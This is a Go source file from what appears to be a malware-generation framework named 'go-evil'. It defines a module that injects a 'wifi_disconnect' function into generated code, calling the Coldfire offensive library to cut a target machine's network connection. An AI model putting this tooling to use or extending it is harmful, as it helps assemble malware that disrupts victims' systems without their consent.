package network

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
)

// Tries to disconnect from the wifi
func Wifi_disconnect(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "wifi_disconnect"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{},
		Gut: []string{
			"err := coldfire.WifiDisconnect()",
			"if err != nil {",
			"spine.log(err.Error())",
			"}",
		}})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("strings")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
